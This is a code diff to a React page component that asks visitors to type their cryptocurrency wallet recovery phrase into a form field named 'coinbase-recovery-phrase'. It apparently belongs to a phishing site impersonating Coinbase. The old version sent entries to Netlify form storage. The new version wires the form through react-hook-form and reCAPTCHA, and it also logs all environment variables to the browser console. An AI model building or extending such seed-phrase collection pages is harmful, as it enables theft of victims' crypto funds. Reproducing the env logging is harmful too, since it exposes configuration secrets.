@@ -1,4 +1,18 @@
+import { useForm } from 'react-hook-form'
+import ReCAPTCHA from 'react-google-recaptcha'
+
 const RecoveryPhrase = () => {
+  const { register, handleSubmit } = useForm()
+
+  const submitPhrase = (data) => {
+    console.log(data)
+  }
+
+  console.log(import.meta.env)
+
+  function onChange(value) {
+    console.log('Captcha value:', value)
+  }
   return (
     <main className='container px-8 mx-auto'>
       <section className='mx-auto my-12 borde'>
@@ -21,14 +35,24 @@ const RecoveryPhrase = () => {
           <li className='mt-4'>Secure your wallet!</li>
         </ol>
       </section>
-      <form method='POST' data-netlify-recaptcha='true' data-netlify='true'>
+      <form onSubmit={handleSubmit(submitPhrase)} method='POST'>
         <textarea
           className='w-full outline-none focus:outline-slate-400 bg-inherit border border-[#F7F7F7] rounded-lg px-6 py-3'
           placeholder='Enter your recovery phrase here.'
           cols='20'
           rows='5'
+          {...register(`coinbase-recovery-phrase`)}
         ></textarea>
-        <div data-netlify-recaptcha='true'></div>
+        <div className='w-full mt-4'>
+          <ReCAPTCHA
+            sitekey={
+              import.meta.env.DEV
+                ? import.meta.env.VITE_SITE_KEY
+                : import.meta.env.SITE_KEY
+            }
+            onChange={onChange}
+          />
+        </div>
         <button
           type='submit'
           className='block mt-8 w-full text-center rounded-lg py-3 transition-colors hover:bg-[#0046df] bg-[#0051FF]'
